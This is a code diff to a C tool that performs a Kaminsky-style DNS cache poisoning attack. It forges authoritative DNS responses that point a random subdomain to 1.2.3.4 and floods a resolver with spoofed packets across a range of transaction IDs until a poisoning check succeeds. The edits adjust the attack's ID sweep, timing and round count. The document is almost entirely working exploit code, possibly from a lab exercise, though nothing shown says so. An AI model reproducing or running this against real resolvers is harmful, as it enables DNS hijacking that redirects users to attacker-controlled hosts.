@@ -160,8 +160,8 @@ int create_kaminsky_response(uint8_t **wire_data, size_t *wire_size, uint16_t tx
 
     ldns_pkt_set_qr(pkt, true);
     ldns_pkt_set_aa(pkt, true);
-    ldns_pkt_set_rd(pkt, true);
-    ldns_pkt_set_ra(pkt, true);
+    // ldns_pkt_set_rd(pkt, false);
+    // ldns_pkt_set_ra(pkt, false);
     ldns_pkt_set_id(pkt, txid);
     ldns_pkt_set_rcode(pkt, LDNS_RCODE_NOERROR);
 
@@ -173,6 +173,20 @@ int create_kaminsky_response(uint8_t **wire_data, size_t *wire_size, uint16_t tx
             ldns_rr_set_type(question_rr, LDNS_RR_TYPE_A);
             ldns_rr_set_class(question_rr, LDNS_RR_CLASS_IN);
             ldns_pkt_push_rr(pkt, LDNS_SECTION_QUESTION, question_rr);
+        }
+    }
+
+    ldns_rr *answer_rr = ldns_rr_new();
+    if (answer_rr) {
+        ldns_rdf *answer_owner_rdf = ldns_dname_new_frm_str(subdomain);
+        ldns_rdf *answer_ip_rdf = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, "1.2.3.4");
+        if (answer_owner_rdf && answer_ip_rdf) {
+            ldns_rr_set_owner(answer_rr, answer_owner_rdf);
+            ldns_rr_set_type(answer_rr, LDNS_RR_TYPE_A);
+            ldns_rr_set_class(answer_rr, LDNS_RR_CLASS_IN);
+            ldns_rr_set_ttl(answer_rr, 300);
+            ldns_rr_push_rdf(answer_rr, answer_ip_rdf);
+            ldns_pkt_push_rr(pkt, LDNS_SECTION_ANSWER, answer_rr);
         }
     }
 
@@ -414,12 +428,12 @@ int send_spoof_burst(const char *subdomain, int resolver_port, int budget) {
     inet_pton(AF_INET, RESOLVER_IP, &target_address.sin_addr);
 
     // Fix 1: Use int instead of uint16_t to avoid comparison warning
-    for (int index = 0; index < 20 && packets_sent < budget; index++) {
+    for (int txid = 0; txid < 16384 && packets_sent < budget; txid++) {
         uint8_t *dns_data = NULL;
         size_t dns_size = 0;
 
         // Fix 2: Cast int to uint16_t for the function call
-        int txid = rand() % 65537;
+        //int txid = rand() % 65537;
         int dns_created = create_kaminsky_response(&dns_data, &dns_size, (uint16_t)txid, subdomain);
         if (dns_created != 1 || dns_data == NULL) {
             continue;
@@ -468,7 +482,7 @@ int send_spoof_burst(const char *subdomain, int resolver_port, int budget) {
         free(dns_data);
 
         if (packets_sent % 500 == 0 && packets_sent > 0) {
-            usleep(200);
+            //usleep(100);
             printf("[SPOOF] Sent %d packets so far...\n", packets_sent);
         }
     }
@@ -516,7 +530,7 @@ int main(void) {
 
     const int MAX_SPOOFED = 20 * 65536;
     int total_spoofed = 0;
-    const int MAX_ROUNDS = 65000;
+    const int MAX_ROUNDS = 80;
 
     for (int round = 0; round < MAX_ROUNDS && total_spoofed < MAX_SPOOFED; round++) {
         char subdomain[256];
@@ -524,7 +538,7 @@ int main(void) {
         printf("[CLIENT] == ROUND %d, subdomain: %s ===\n", round, subdomain);
 
         send_subdomain_query(subdomain);
-        usleep(1);
+        usleep(6);
         int budget = MAX_SPOOFED - total_spoofed;
         int sent_now = send_spoof_burst(subdomain, resolver_port, budget);
         total_spoofed = total_spoofed + sent_now;
@@ -533,6 +547,7 @@ int main(void) {
         if (check_poisoned()) {
             break;
         }
+        usleep(200);
     }
     return 0;
 }
